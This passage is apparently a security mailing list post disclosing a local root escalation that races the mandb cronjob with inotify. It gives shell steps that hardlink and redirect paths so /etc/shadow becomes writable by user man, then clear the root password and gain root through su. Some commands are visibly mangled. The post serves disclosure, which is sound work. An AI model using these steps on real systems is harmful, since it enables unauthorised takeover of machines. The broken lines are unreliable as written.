I was referring to this from [1], but perhaps I should have highlighted it more prominently:   Using Timerace Using Inotify: As the mandb cronjob will change ownership of any file to user man, there are numerous targets for privilege escalation. The one I like best when /bin/su SUID binary available is to change /etc/shadow. PAM just does not recognise this state, so only root password has to be cleared for su logon. For that purpose, the good old inotify-tool from a previous article. To escalate following steps are sufficient:  man# mkdir -p /var/cache/man/etc man# ln /var/crash/.lock /var/cache/man/etc/shadow man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0 - --MovePath /var/cache/man/etc --LinkTarget /etc ... Wait till daily cronjob was run man# cp /etc/shadow . man# sed -r -e /etc/shadow > x man# cat x > /etc/shadow; rm x man# su -s /bin/sh (password is root# cat shadow > /etc/shadow; chown root /etc/shadow  [1]  - --  http://www.halfdog.net/ PGP: AE98 B91F FE88  2BD8 feed a bee -----BEGIN PGP SIGNATURE----- Version: GnuPG v1  =zuRK -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
